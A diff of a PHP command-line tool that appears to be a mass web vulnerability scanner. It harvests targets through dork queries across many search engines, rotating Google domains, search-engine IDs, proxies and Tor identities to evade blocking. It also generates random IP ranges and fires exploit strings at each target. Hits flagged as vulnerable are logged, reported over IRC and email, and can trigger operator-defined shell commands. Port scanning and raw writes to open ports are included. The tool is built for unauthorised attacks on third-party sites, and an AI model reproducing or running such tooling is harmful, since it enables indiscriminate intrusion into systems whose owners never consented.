     echo "         |[ SUB PROCESS ]::\n";
     $target = __filterHostname($target);
 
     foreach ($exploitArray as $value) {
+
         $postDados = !is_null($_SESSION["config"]["sub-post"]) ? __convertUrlQuery($value) : NULL;
         $url = "{$target}{$value}";
-        echo "{$_SESSION["c7"]}-[|||]{$_SESSION["c0"]}";
-        $resultado__ = __request_info($curl = curl_init(), $url, $_SESSION["config"]["proxy"], $postDados);
+        echo "{$_SESSION["c7"]}-[||]{$_SESSION["c0"]}";
+        $resultado__ = __request_info($url, $_SESSION["config"]["proxy"], $postDados);
         __plus();
-        $_ex['erroReturn'] = __checkError($resultado__['corpo']);
+        $ifcode = not_isnull_empty($_SESSION['config']['ifcode']) &&
+                strstr($resultado__['server']['http_code'], $_SESSION['config']['ifcode']) ?
+                "CODE_HTTP_FOUND: {$_SESSION['config']['ifcode']} / " : NULL;
+        $ifredirect = (strstr($resultado__['server']['redirect_url'], $_SESSION['config']['ifredirect'])) ? $resultado__['server']['redirect_url'] : NULL;
+        $_ex['erroReturn'] = $ifredirect . $ifcode . __checkError($resultado__['corpo']);
+
         __plus();
-        $_ex['vull_style'] = (not_isnull_empty($_ex['erroReturn'])) ? "{$_SESSION["c15"]}[ INFO ][{$_ex['erroReturn']} ]\n[ INFO ][ TARGET POTENTIALLY VULNERABLE ]: " . __cli_beep() : NULL;
+        $_ex['vull_style'] = (not_isnull_empty($_ex['erroReturn'])) ?
+                "{$_SESSION["c15"]}[ INFO ][{$_ex['erroReturn']} ]\n[ INFO ][ TARGET POTENTIALLY VULNERABLE ]: " . __cli_beep() : NULL;
         echo (not_isnull_empty($_ex['erroReturn']) ? "\n{$_ex['vull_style']}{$url}\n{$_SESSION["c0"]}" : NULL);
-        (not_isnull_empty($_ex['erroReturn']) ? __saveValue($_SESSION['config']['arquivo_output'], $url, 1) : NULL);
+        echo (not_isnull_empty($_ex['erroReturn']) ? __saveValue($_SESSION['config']['arquivo_output'], $url, 1) . "\n" : NULL);
+        __plus();
+        $_SESSION['config']['resultado_valores'].=(not_isnull_empty($_ex['erroReturn']) ? "{$url}\n" : NULL);
+        (not_isnull_empty($_ex['erroReturn']) && not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ?
+                        __ircMsg($_SESSION['config']['irc'], "{$_ex['erroReturn']}::: {$url}") : NULL);
+
+        (not_isnull_empty($_ex['erroReturn']) && !is_null($_SESSION['config']['sub-cmd-vul']) ? __command($_SESSION['config']['sub-cmd-vul'], $url) : NULL);
+        (not_isnull_empty($_SESSION['config']['sub-cmd-all']) ? __command($_SESSION['config']['sub-cmd-all'], $url) : NULL);
         __plus();
         __timeSec('delay');
     }
@@ -1925,6 +2851,8 @@ function __subExecExploits($target, $exploitArray = array()) {
 
 ################################################################################
 #SEND VALUES EMAIL##############################################################
+################################################################################
+# (PHP 4, PHP 5) mail — Send mailhttp://php.net/manual/en/function.mail.php
 
 function __sendMail($email, $value) {
 
@@ -1939,13 +2867,7 @@ function __sendMail($email, $value) {
     $body.=not_isnull_empty($_SESSION['config']['motor']) ? "MOTOR BUSCA: {$_SESSION['config']['motor']}\n" : NULL;
     $body.=not_isnull_empty($_SESSION['config']['tipoerro']) ? "TIPO ERROR: {$_SESSION['config']['tipoerro']}\n" : NULL;
     $body.=not_isnull_empty($_SESSION['config']['exploit-get']) ? "EXPLOIT GET: {$_SESSION['config']['exploit-get']}\n" : NULL;
-    if (not_isnull_empty($_SESSION['config']['exploit-post'])) {
-        foreach ($_SESSION['config']['exploit-post'] as $key => $_v) {
-            $post.="{$key}: $_v";
-            __plus();
-        }
-        $body.=not_isnull_empty($post) ? "EXPLOIT-POST: {$post}\n" : NULL;
-    }
+    $body.=not_isnull_empty($_SESSION['config']['exploit-post']) ? "EXPLOIT-POST: {$_SESSION['config']['exploit-post']}\n" : NULL;
     $body.=not_isnull_empty($_SESSION['config']['command-vul']) ? "COMMAND VUL: {$_SESSION['config']['command-vul']}\n" : NULL;
     $body.=not_isnull_empty($_SESSION['config']['command-all']) ? "COMMAND ALL: {$_SESSION['config']['command-all']}\n" : NULL;
     $body.=not_isnull_empty($_SESSION['config']['user-agent']) ? "USER AGENT: {$_SESSION['config']['user-agent']}\n" : NULL;
@@ -1962,8 +2884,10 @@ function __sendMail($email, $value) {
 
 ################################################################################
 #HOST GOOGLE RANDOM#############################################################
+################################################################################
 
 function __dominioGoogleRandom() {
+
     $_SESSION["random"]['dominio_google'] = array(
         'www.google.com', 'www.google.ac', 'www.google.com.om',
         'www.google.ad', 'www.google.ae', 'www.google.com.af',
@@ -2036,8 +2960,10 @@ function __dominioGoogleRandom() {
 
 ################################################################################
 #(CSE)-GOOGLE Custom Search Engine ID RANDOM####################################
+################################################################################
 
 function __googleGenericRandom() {
+
     $generic = array(
         '013269018370076798483:wdba3dlnxqm',
         '005911257635119896548:iiolgmwf2se',
@@ -2049,19 +2975,27 @@ function __googleGenericRandom() {
         '003917828085772992913:gmoeray5sa8',
         '007843865286850066037:3ajwn2jlweq',
         '010479943387663786936:wjwf2xkhfmq',
-        '012873187529719969291:yexdhbzntue'
+        '012873187529719969291:yexdhbzntue',
+        '012347377894689429761:wgkj5jn9ee4'
     );
     return $generic[rand(0, count($generic) - 1)];
 }
 
 ################################################################################
 #PROXY HTTP BASE FILE###########################################################
+################################################################################
 
 function __proxyHttpRandom() {
+
     $proxy_file = (file_exists($_SESSION['config']['proxy-http-file']) ? __openFile($_SESSION['config']['proxy-http-file'], 1) : array());
     $proxy_ = is_array($proxy_file) ? array_merge($_SESSION['config']['proxy-http'], $proxy_file) : $_SESSION['config']['proxy-http'];
+
     return $proxy_[rand(0, count($proxy_) - 1)];
 }
+
+################################################################################
+#FILTER UNIQUE DOMAIN###########################################################
+################################################################################
 
 function __filterDomainUnique($resultados) {
 
@@ -2075,248 +3009,534 @@ function __filterDomainUnique($resultados) {
         return array_unique(array_filter($temp));
     }
 
-    RETURN FALSE;
+    return FALSE;
+}
+
+################################################################################
+#FILTER IF URL DOMAIN###########################################################
+################################################################################
+
+function __filterURLif($resultados) {
+
+    if (is_array($resultados)) {
+
+        foreach ($resultados as $value) {
+
+            $temp[] = not_isnull_empty($_SESSION['config']['ifurl']) && strstr($value, $_SESSION['config']['ifurl']) ? $value : NULL;
+        }
+
+        return array_unique(array_filter($temp));
+    }
+
+    return FALSE;
+}
+
+################################################################################
+#GENERATOR RANGE IP#############################################################
+################################################################################
+
+function __generatorRangeIP($range) {
+
+    $ip_ = explode(',', $range);
+    if (is_array($ip_)) {
+
+        $_ = array(0 => ip2long($ip_[0]), 1 => ip2long($ip_[1]));
+        while ($_[0] <= $_[1]) {
+
+            $ips[] = "http://" . long2ip($_[0]);
+            $_[0] ++;
+        }
+    } else {
+
+        return FALSE;
+    }
+
+    return $ips;
+}
+
+################################################################################
+#GENERATOR RANGE IP RANDOM######################################################
+################################################################################
+
+function __generatorIPRandom($cont) {
+
+    $cont[0] = 0;
+    while ($cont[0] < $cont[1]) {
+
+        $bloc[0] = rand(0, 255);
+        $bloc[1] = rand(0, 255);
+        $bloc[2] = rand(0, 255);
+        $bloc[3] = rand(0, 255);
+        $ip[] = "http://{$bloc[0]}.{$bloc[1]}.{$bloc[2]}.{$bloc[3]}";
+        $cont[0] ++;
+    }
+    return array_unique($ip);
+}
+
+################################################################################
+#ACESSING FILE ROBOTS###########################################################
+################################################################################
+
+function __getValuesRobots($url) {
+
+    $_[0] = "http://" . __filterHostname($url) . "/robots.txt";
+    $_[0] = __request_info($_[0], $_SESSION["config"]["proxy"], NULL);
+    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
+    echo "         |[ ACCESSING FILE ROBOTS ]::\n";
+
+    if (not_isnull_empty($_[0]['corpo']) && $_[0]['server']['http_code'] == 200) {
+
+        $_[1] = array_unique(array_filter(explode("\n", $_[0]['corpo'])));
+
+        foreach ($_[1] as $value) {
+
+            if (strstr($value, 'Disallow:') || strstr($value, 'Allow:')) {
+
+                echo "|_[ + ]__|[ value={$value}\n";
+                __saveValue($_SESSION['config']['arquivo_output'], $value, 2);
+            }
+            __plus();
+        }
+    } else {
+
+        echo "\t[x][ ERRO ] LOAD FILE ROBOTS.TXT [ COD_HTTP ]:: {$_[0]['server']['http_code']}\n{$_SESSION["c0"]}";
+    }
+}
+
+################################################################################
+#Base64 string encryption md5 , hexadecimal, hex, base64 & random string########
+################################################################################
+
+function __crypt($url) {
+
+    preg_match_all("#(md5|base64|hex|random)(\()(.*?)(\))#", $url, $_);
+    $cont = 0;
+
+    foreach ($_[0] as $replace) {
+
+        if (strstr($replace, 'md5('))
+            $func = 'md5';
+
+        if (strstr($replace, 'base64('))
+            $func = 'base64_encode';
+
+        if (strstr($replace, 'hex('))
+            $func = 'bin2hex';
+
+        if (strstr($replace, 'random('))
+            $func = 'random';
+
+        $url = str_replace($replace, $func($_[3][$cont]), $url);
+        $cont ++;
+    }
+    return $url;
+}
+
+################################################################################
+#GENERATE RANDOM STRING#########################################################
+################################################################################
+#(PHP4,PHP5) Shuffle an array http://php.net/manual/en/function.shuffle.php
+
+function random($__) {
+    $_ = 'A,a,B,b,C,c,D,d,E,e,F,f,G,g,';
+    $_.= 'H,h,I,i,J,j,K,k,L,l,M,m,';
+    $_.= '1,2,3,4,5,6,7,8,9,0';
+    $_ = explode(',', $_);
+    shuffle($_);
+    $_ = implode($_, '');
+    return substr($_, 0, $__);
+}
+
+################################################################################
+#GENERATE RANDOM DORKS##########################################################
+################################################################################
+
+function __randomDork($_) {
+
+    $dk[1] = array('view', 'page', 'index', 'file', 'ver', 'web', 'form', 'public', 'map', 'visit',
+        'site', 'perfil', 'sistema', 'system', 'cad', 'frm', 'content', 'conteudo', 'graf', 'page',
+        'search', 'arch', 'class', 'app', 'galeria', 'text', 'noticia', 'default', 'storytopic', 'home',
+        'lenoticia', 'counter', 'todos', 'all', 'principal', 'main', 'pesquisa', 'dir', 'category', 'news_more',
+        'info', 'display', 'showrecord', 'download', 'sum', 'produtos', 'Menu', 'guia', 'product', 'about',
+        'WebForms', 'proj', 'inter', 'PageText', 'topper', 'notes', 'name', 'redirect', 'open_link', 'artist',
+        'curricu', 'resumen', 'top', 'list', 'directorio', 'Project', 'membre', 'photos', 'Contenido',
+        'presentation', 'component', 'release', 'article', 'asesores', 'Detail', 'about', 'lire', 'story',
+        'memoriam', 'transport', 'journal', 'album', 'community', 'includes', 'ler', 'video', 'configs', 'refer',
+        'form_cpf', 'atualiza', 'refresh', 'materia', 'fotos', 'photos', 'itemdetail', 'listcategoriesandproduct',
+        'myaccount', 'learnmore', 'powersearch', 'prodbycat', 'prodetails', 'prodlist', 'productDisplay', 'promotion',
+        'pview', 'resellers', 'inc', 'oferta', 'layout', 'standard', 'blank', 'path', 'declaration', 'newsitem', 'games',
+        'buy', 'readnews', 'event', 'news_view', 'communique_detail', 'kategorie', 'preview', 'faq2', 'comment', 'newsDetail',
+        'shopping', 'shop_category', 'product_ranges_view', 'section', 'ages', 'curriculum', 'galeri_info', 'tekst', 'play_old',
+        'viewapp', 'padrao', 'sitio', 'head', 'template', 'index1', 'index2', 'index3', 'index4', 'index5', 'mod', 'press', 'gery',
+        'index_table', 'mainfile', '_functions', 'phpshop', 'new-visitor.inc', 'Packages', 'editor', 'board', 'advanced', 'pref',
+        'q', 'side', 'home1', 'home2', 'home3', 'getbook', 'checkout', 'affiliate', 'addcart', 'product_info', 'showsub', 'library',
+        'edition', 'get', 'temp', 'catalog', 'press2', 'company', 'jobs', 'review', 'input', 'cats', 'showmedia', 'event_info'
+    );
+
+
+    $dk[2] = array('view', 'file', 'ver', 'web', 'form', 'public', 'map', 'site', 'perfil', 'bookid',
+        'sistema', 'system', 'cad', 'frm', 'content', 'id', 'action', 'user', 'option', 'area', 'catalogid',
+        'tp', 'pg', 'p', 'v', 'a', 't', 'r', 'o', 'm', 'n', 'sec', 'lang', 'search', 'Itemid', 'open',
+        'servicoid', 'id_ap', 'artic', 'pag', 'archive', 'ind', 'sigl', 'url', 'link', 'tp', 'cd', 'item_ID',
+        'web', 'sourc', 'sitemap', 'go', 'galeria', 'img', 'notic', 'num', 'ter', 'dow', 'type', 'CartId',
+        'redir', 'default', 'storytopic', 'topic', 'cod_noti', 'detalhe', 'ler', 'storyid', 'start',
+        'click', 'title', 'tmpl', 'templat', 'cont', 'corp', 'contat', 'consult', 'main', 'exib', 'guia',
+        'span', 'OpenDocument', 'document', 'codidem', 'pesq', 'print', 'imprimir', 'jobs', 'pic', 'contri',
+        'code', 'myPage', 'openPage', 'homepage', 'home', 'inner', 'custom', 'bin', 'IsisScript', 'pid',
+        'wxis.exe', 'wood', 'modules', 'kbn', 'chid', 'jump', 'mes', 'ano', 'month', 'year', 'day', 'dia', 'pre',
+        'show', 'download', 'summit', 'new', 'coming', 'Category', 'produtos', 'Menu', 'uid', 'Consulta', 'qry',
+        'product', 'WebForms', 'proj', 'inter', 'scgi', 'orig_q', 'b1', 'showpage', 'filter', 'Detail', 'about',
+        'itemlist', 'memor', 'info', 'website', 'cidade', 'lic', 'materia', 'SEC_', 'includes', 'store', 'ler',
+        'reader', 'src', 'theme', 'Boletim', 'busca', 'date', 'video', 'configs', 'exec', 'doc', 'refresh', 'telec',
+        'digital', 'materia', 'portal', 'shop', 'photos', 'sales', 'open', 'check', 'token', 'general', 'process', 'ViewType',
+        'idCategor', 'intCatalogID', 'Cart', 'maingroup', 'play', 'where', 'mod', 'panel', 'str', 'staff_id', 'buy', 'preview',
+        'chapter', 'club_id', 'GLOBALS', 'absolute_path', 'body', 'from', 'pg_ID', 'load', 'systempath', 'conf', 'do', 'x', 'temp',
+        'see', 'act', 'middle', 'content', 'q', 'my', 'to', 'nivel', 'arq', 'modo', 'rss', 'pagina', 'opcion', 'loader', 'l', 'this',
+        'subject', 'param', 'index', 'tipo', 'second', 'loc', 'cat_id', 'magazin', 'artist_art', 'cID', 'cat', 'message_id', ''
+    );
+
+    $dk[3] = array('aspx', 'asp', 'cfm', 'php', 'php3', 'pl', 'cgi', 'py', 'jsp');
+
+    for ($i = 0; $i <= $_; $i++) {
+
+        $dm = NULL;
+        $da = $dk[1][rand(0, count($dk[1]) - 1)];
+        $dg = $dk[2][rand(0, count($dk[2]) - 1)];
+        $de = $dk[3][rand(0, count($dk[3]) - 1)];
+
+        $__[] = "\"{$dm}/{$da}.{$de}?{$dg}\"";
+    }
+    return $__;
+}
+
+################################################################################
+#VALIDATING OPEN DOORS##########################################################
+################################################################################
+#(PHP 4, PHP 5) fsockopen — Open Internet or Unix domain socket connection
+#http://php.net/manual/en/function.fsockopen.php
+
+function __portScan($_) {
+
+    // FORMAT PORTS 80, 8181, 22, 21
+    $ports = explode(',', $_[1]);
+    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
+    echo "         |[ PROCESS PORT-SCAN ]::\n";
+    foreach ($ports as $value) {
+
+        $conc = fsockopen($_SESSION['config']['server_ip'], $value, $_[2], $_[3], 30);
+        // HOST, POST, ERROR1, ERROR3, TIMEOUT
+
+        __plus();
+
+        if ($conc) {
+
+            echo "{$_SESSION["c1"]}|_[ + ]__|[ {$value}=\033[1m\033[32mOPEN{$_SESSION["c0"]}";
+            (not_isnull_empty($_SESSION['config']['port-write']) ? __portWrite($conc, $_SESSION['config']['port-write']) : NULL);
+            __saveValue($_SESSION['config']['arquivo_output'], "{$value}=OPEN", 2);
+
+            __plus();
+            $_[0]['url_port'] = $value;
+            (not_isnull_empty($_SESSION['config']['port-cmd']) ? __command($_SESSION['config']['port-cmd'], $_[0]) : NULL);
+            __plus();
+        } else {
+
+            echo "{$_SESSION["c1"]}|_[ x ]__|[ {$value}={$_SESSION["c9"]}CLOSED{$_SESSION["c0"]}\n";
+            __plus();
+        }
+    }
+    echo $_SESSION["c0"];
+    fclose($conc);
+}
+
+################################################################################
+#WRITING ON THE DOOR############################################################
+################################################################################
+#(PHP 4, PHP 5) fwrite — Binary-safe file write
+#http://php.net/manual/pt_BR/function.fwrite.php
+
+function __portWrite($conect, $valores) {
+
+    $valores = explode(',', $valores);
+    foreach ($valores as $value) {
+
+        echo "{$_SESSION["c1"]}|_[ + ]__|[ WRITE SEND={$value}{$_SESSION["c0"]}\n";
+        fwrite($conect, "{$value}\r\n") . sleep(3);
+        __plus();
+    }
 }
 
 ################################################################################
 #CODE SEARCH ENGINES############################################################
-$_SESSION['config']['cod'] = ' 
-    
-$dork_ = (not_isnull_empty($dork__)) ? $dork__ : __getOut("DEFINA SUA DORK\n");
-$list_proxy_ = (!is_null($list_proxy) ? $list_proxy[rand(0, count($list_proxy) - 1)] : NULL);
-$confArray["list_proxy_rand"] = $list_proxy_;
-$confArray["list_proxy_file"] = $list_proxy;
-(!is_null($_SESSION["config"]["tor-random"]) && !is_null($_SESSION["config"]["proxy"]) ? __renewTOR() : NULL);
-echo "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c1"]}{{$_SESSION["c0"]} ";
+################################################################################
+//$_SESSION['config']['cod'] = ' 
 
-__plus();
+function __engines($dork, $list_proxy) {
 
-echo (!is_null($list_proxy_) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ PROXY FILE RANDOM ]:: {$_SESSION["c1"]}[ {$list_proxy_} ]{$_SESSION["c0"]} " : NULL );
+    $dork_ = (not_isnull_empty($dork)) ? $dork : __getOut("DEFINA SUA DORK\n");
+    $list_proxy_ = (!is_null($list_proxy) ? $list_proxy[rand(0, count($list_proxy) - 1)] : NULL);
+
+    $confArray = array("list_proxy_rand" => $list_proxy_, "list_proxy_file" => $list_proxy);
+
+    (!is_null($_SESSION["config"]["tor-random"]) && !is_null($_SESSION["config"]["proxy"]) ? __renewTOR() : NULL);
+
+    echo "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c1"]}{{$_SESSION["c0"]} ";
+
+    __plus();
+
+    echo (!is_null($list_proxy_) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ PROXY FILE RANDOM ]:: {$_SESSION["c1"]}[ {$list_proxy_} ]{$_SESSION["c0"]} " : NULL );
 
 ################################################################################
 # SEARCH ENGINE :::  google
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-$randHost = __dominioGoogleRandom();
-__pageEngine($confArray, "GOOGLE - {$randHost}", "https://{$randHost}/search?q=[DORK]&num=1500&btnG=Search&pws=1",$dork_,$postDados, 0, 0, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        $randHost = __dominioGoogleRandom();
+        $_SESSION["config"]["dork_tmp"] = $dork_;
+        $_SESSION["config"]["conf_array_tmp"] = $confArray;
+        __pageEngine($confArray, "GOOGLE - {$randHost}", "https://{$randHost}/search?q=[DORK]&num=1500&btnG=Search&pws=1", $dork_, $postDados, 0, 0, 1);
+    }
 
 
 ################################################################################
 # SEARCH ENGINE :::  bing
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 2) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "BING", "http://www.bing.com/search?q=[DORK]&&filt=rf&first=[PAG]",$dork_,$postDados, 1, 991, 50);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 2) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "BING", "http://www.bing.com/search?q=[DORK]&&filt=rf&first=[PAG]", $dork_, $postDados, 1, 991, 50);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  yahoo
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 3) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "YAHOO BR", "http://search.yahoo.com/search?p=[DORK]&ei=UTF-8&b=[PAG]",$dork_,$postDados, 1, 471, 10);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 3) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "YAHOO BR", "http://search.yahoo.com/search?p=[DORK]&ei=UTF-8&b=[PAG]", $dork_, $postDados, 1, 471, 10);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  ask
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 4) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray,"ASK", "http://www.ask.com/web?q=[DORK]&page=[PAG]&qid=[RANDOM]",$dork_,$postDados, 0, 16, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 4) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "ASK", "http://www.ask.com/web?q=[DORK]&page=[PAG]&qid=[RANDOM]", $dork_, $postDados, 0, 16, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  hao123
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 5) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "HAO123 BR", "http://search.hao123.com.br/s?tn=[RANDOM]&f=0&wd=[DORK]&haobd=[RANDOM]FG=1&ie=utf-8&pn=[PAG]&showTop=0",$dork_,$postDados, 0, 550, 10);
-}
+
+    if (__validateOptions($_SESSION["config"]["motor"], 5) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "HAO123 BR", "http://search.hao123.com.br/s?tn=[RANDOM]&f=0&wd=[DORK]&haobd=[RANDOM]FG=1&ie=utf-8&pn=[PAG]&showTop=0", $dork_, $postDados, 0, 550, 10);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  googleapis 
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], 6) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "GOOGLE API", "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&rsz=8&q=[DORK]&start=[PAG]&userip=[IP]&filter=1&safe=off",$dork_,$postDados, 0, 56, 4);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], 6) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "GOOGLE API", "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&rsz=8&q=[DORK]&start=[PAG]&userip=[IP]&filter=1&safe=off", $dork_, $postDados, 0, 56, 4);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  lycos
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 7) || __validateOptions($_SESSION["config"]["motor"], "all")) {
-$_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos(__request_info($curlObject_id = curl_init(), "http://search.lycos.com", $_SESSION["config"]["proxy"], $postDados)["corpo"]);
 
-__pageEngine($confArray,"LYCOS", "http://search.lycos.com/web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}&pn=[PAG]",$dork_,$postDados, 0, 24, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 7) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+        $_ = __request_info("http://search.lycos.com", $_SESSION["config"]["proxy"], $postDados);
+        $_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos($_["corpo"]);
+
+        __pageEngine($confArray, "LYCOS", "http://search.lycos.com/web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}&pn=[PAG]", $dork_, $postDados, 0, 24, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  uol.com.br
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 8) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "UOL BR", "http://busca.uol.com.br/web/?q=[DORK]&start=[PAG]",$dork_,$postDados, 10, 130, 10);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 8) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "UOL BR", "http://busca.uol.com.br/web/?q=[DORK]&start=[PAG]", $dork_, $postDados, 10, 130, 10);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  us.yhs4.search.yahoo
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 9) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "YAHOO US", "http://us.yhs4.search.yahoo.com/yhs/search?p=[DORK]&fr=goodsearch-yhsif&b=[PAG]",$dork_,$postDados, 1, 551, 10);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 9) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "YAHOO US", "http://us.yhs4.search.yahoo.com/yhs/search?p=[DORK]&fr=goodsearch-yhsif&b=[PAG]", $dork_, $postDados, 1, 551, 10);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  sapo.pt
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 10) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "SAPO", "http://pesquisa.sapo.pt/?adultfilter=strict&barra=resumo&cluster=0&format=html&limit=10&location=pt&page=[PAG]&q=[DORK]&st=web",$dork_,$postDados, 0, 14, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 10) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "SAPO", "http://pesquisa.sapo.pt/?adultfilter=strict&barra=resumo&cluster=0&format=html&limit=10&location=pt&page=[PAG]&q=[DORK]&st=web", $dork_, $postDados, 0, 14, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  dmoz
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 11) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "DMOZ", "http://www.dmoz.org/search/search?q=[DORK]&start=[PAG]&type=next&all=yes&cat=",$dork_,$postDados, 0, 800, 20);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 11) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "DMOZ", "http://www.dmoz.org/search/search?q=[DORK]&start=[PAG]&type=next&all=yes&cat=", $dork_, $postDados, 0, 800, 20);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  gigablast
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 12) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "GIGABLAST", "http://www.gigablast.com/search?k3h=223119&s=22&rat=0&sc=1&ns=100&n=100&sites=&q=[DORK]",$dork_,$postDados, 0, 1, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 12) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "GIGABLAST", "http://www.gigablast.com/search?k3h=223119&s=22&rat=0&sc=1&ns=100&n=100&sites=&q=[DORK]", $dork_, $postDados, 0, 1, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  web.search.naver.com
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 13) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "NEVER", "http://web.search.naver.com/search.naver?where=webkr&query=[DORK]&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=[PAG]",$dork_,$postDados, 1, 500, 10);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 13) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "NEVER", "http://web.search.naver.com/search.naver?where=webkr&query=[DORK]&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=[PAG]", $dork_, $postDados, 1, 500, 10);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  br.baidu.com
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 14) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "BAIDU BR", "http://www.baidu.com.br/s?usm=1&rn=100&wd=[DORK]&ie=utf-8&pn=[PAG]&showTop=0",$dork_,$postDados, 0, 1500, 100);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 14) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "BAIDU BR", "http://www.baidu.com.br/s?usm=1&rn=100&wd=[DORK]&ie=utf-8&pn=[PAG]&showTop=0", $dork_, $postDados, 0, 1500, 100);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  www.yandex.ru
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 15) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "YANDEX", "http://yandex.ru/yandsearch?text=[DORK]&p=[PAG]&lr=10136",$dork_,$postDados, 0, 30, 1);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 15) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
+        __pageEngine($confArray, "YANDEX", "http://yandex.ru/yandsearch?text=[DORK]&p=[PAG]&lr=10136", $dork_, $postDados, 0, 30, 1);
+    }
 
 ################################################################################
 # SEARCH ENGINE :::  www.zoo.com
 ################################################################################
-if (__validateOptions($_SESSION["config"]["motor"], 16) || __validateOptions($_SESSION["config"]["motor"], "all")) {
 
-__pageEngine($confArray, "ZOO", "http://www.zoo.com/Zoo-Site/search/web?qsi=[PAG2]&q=[DORK]&p=[PAG]&fcoid=4&fpid=2",$dork_,$postDados, 1, 211, 20, 10);
-}
+    if (__validateOptions($_SESSION["config"]["motor"], 16) || __validateOptions($_SESSION["config"]["motor"], "all")) {
+
